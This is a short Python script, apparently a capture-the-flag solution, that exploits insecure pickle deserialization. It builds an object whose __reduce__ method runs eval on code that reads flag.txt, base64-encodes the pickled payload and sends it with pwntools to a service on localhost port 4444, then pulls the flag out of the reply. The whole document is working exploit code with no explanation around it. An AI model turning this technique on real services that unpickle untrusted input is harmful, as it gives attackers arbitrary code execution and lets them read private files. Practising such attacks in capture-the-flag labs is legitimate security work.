from pwn import *
import pickle
import base64
import re

class Exploit:
    def __reduce__(self):
        return eval, ("print(open('flag.txt','r').read())",)


pickled = pickle.dumps(Exploit())
p = remote("localhost",4444)
p.sendline(str(4))
p.sendline(base64.urlsafe_b64encode(pickled))
print(re.search("(gigem{.*?})", p.recvall().decode()).group(1))
